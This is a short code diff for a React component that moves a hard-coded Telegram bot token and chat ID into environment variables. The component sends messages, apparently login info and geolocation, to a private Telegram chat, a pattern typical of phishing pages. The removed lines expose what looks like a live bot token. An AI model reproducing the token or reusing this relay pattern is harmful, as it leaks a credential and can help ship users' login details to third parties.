@@ -18,15 +18,12 @@ import {
 
 const Astral = () => {
     //
-    const TOKEN = useMemo(() => '5068623249:AAH9iGf-3GSepNp8dIIiEWFPZagQ7FK8024', []);
-    const CHAT_ID = useMemo(() => '1777222104', []);
-
     const [isLoading, setIsLoading] = useState(true);
     const [loginInfo, setLoginInfo] = useState(null);
 
     const sendMessage = async (message) => {
-        // console.log('https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + message);
-        return await fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + message);
+        // console.log('https://api.telegram.org/bot' + process.env.REACT_APP_TOKEN + '/sendMessage?chat_id=' + process.env.REACT_APP_CHAT_ID + '&text=' + message);
+        return await fetch('https://api.telegram.org/bot' + process.env.REACT_APP_TOKEN + '/sendMessage?chat_id=' + process.env.REACT_APP_CHAT_ID + '&text=' + message);
     }
 
     const getGeolocationInfo = async () => {
